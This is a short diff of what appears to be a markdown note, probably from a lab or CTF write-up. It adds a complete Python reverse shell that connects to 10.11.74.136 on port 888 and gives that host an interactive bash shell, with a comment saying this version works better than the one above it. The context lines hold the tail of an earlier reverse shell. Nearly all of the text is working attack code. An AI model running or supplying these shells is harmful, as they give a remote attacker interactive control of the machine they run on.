@@ -15,6 +15,16 @@ dup2(s.fileno(),0)
 dup2(s.fileno(),1)
 dup2(s.fileno(),2)
 run(["/bin/bash","-i"])
+
+# It works better the second one
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.11.74.136",888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
 ```
 
 ---
